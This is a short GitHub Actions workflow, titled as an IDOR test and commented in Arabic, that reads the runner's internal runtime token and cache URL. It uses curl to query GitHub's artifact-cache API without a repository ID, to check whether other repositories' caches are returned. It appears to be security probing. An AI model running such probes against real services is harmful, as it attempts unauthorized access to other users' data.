name: Cache API IDOR Test
on: [push]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Query Internal Cache API
        run: |
          # 1. قراءة التوكن الداخلي الذي يربط الـ Runner بخوادم GitHub
          TOKEN="$ACTIONS_RUNTIME_TOKEN"
          URL="$ACTIONS_CACHE_URL"
          
          echo "Cache URL: $URL"
          echo "Token exists: $([ -n "$TOKEN" ] && echo yes || echo no)"
          
          # 2. محاولة الاستعلام عن الكاش بدون تحديد Repository ID محدد
          # لنعرف هل سترد GitHub بأي كاش لا يخصنا؟
          # الـ API يستخدم مسار /_apis/artifactcache/caches
          QUERY_URL="${URL}_apis/artifactcache/caches?keys=test"
          
          echo "Sending IDOR request to: $QUERY_URL"
          
          # 3. إرسال الطلب
          RESPONSE=$(curl -s -H "Authorization: Bearer $TOKEN" "$QUERY_URL")
          
          echo "API Response:"
          echo "$RESPONSE"
